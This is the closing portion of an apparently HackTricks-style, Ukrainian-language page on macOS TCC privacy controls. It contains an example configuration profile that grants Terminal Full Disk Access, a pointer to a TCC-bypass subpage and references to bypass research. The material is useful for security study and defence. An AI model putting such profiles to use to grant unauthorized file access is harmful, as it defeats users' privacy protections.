```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### Обходи TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Глибокий аналіз macOS TCC.db — блог Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command — скрипт для відстеження com.apple.macl (Gist від brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Відстеження та контроль com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Обхід захисту конфіденційності користувачів TCC у macOS випадково та навмисно](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Зміна домашньої теки та обхід TCC, або CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL-ін’єкція в TCC: чому це (ймовірно) не було ризиком безпеки (цього разу)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Розташування та отримання TCC.db у macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Налаштування App Sandbox у macOS](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Entitlement для камери](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Налаштування корисного навантаження керування політикою конфіденційності для пристроїв Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Аналіз вторгнення в macOS: від приманки до компрометації](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
